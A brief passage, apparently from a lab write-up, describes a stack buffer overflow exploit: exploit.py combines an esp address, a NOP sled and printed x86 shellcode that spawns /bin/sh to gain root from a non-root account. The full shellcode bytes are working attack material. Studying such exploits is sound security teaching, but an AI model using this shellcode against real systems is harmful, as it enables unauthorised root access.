The exploit generator exploit.py uses the esp from the disassembler command. Using a NOP sled combined with the esp and the shellcode of "char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; " it breaks the stack and allows you to gain access to root permissions from a guest or not root account.